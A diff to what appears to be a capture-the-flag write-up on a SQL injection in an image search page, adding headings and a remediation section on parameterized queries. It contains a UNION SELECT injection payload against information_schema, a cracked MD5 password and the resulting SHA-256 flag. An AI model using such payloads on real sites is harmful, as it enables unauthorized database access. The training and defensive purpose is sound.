@@ -1,8 +1,11 @@
 
-### Search images by ID
+# Search images by ID
+
+### Introduction
 
 This breach is the same as the MEMBERS breach, explained -> [SQL Injection Members](https://github.com/guysharony/darkly/blob/main/SQL%20Injection%20MEMBERS/Ressources/explanations.md)
 
+### Procedure
 
 ``1 UNION SELECT column_name, table_name FROM information_schema.columns``
 
@@ -68,6 +71,15 @@ Title: If you read this just use this md5 decode lowercase then sha256 to win th
 Url : Hack me ?
 ```
 
-###Decrypt the password
+### Decrypt the password
 
 To decrypt the password, we use the MD5 Decrypt tool, converting ``1928e8083cf461a51303633093573c46`` to ``albatroz``, then encrypt it with a SHA-256 tool, resulting in ``f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188``.
+
+### How to fix 
+
+We can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".
+
+### Sources
+
+https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+
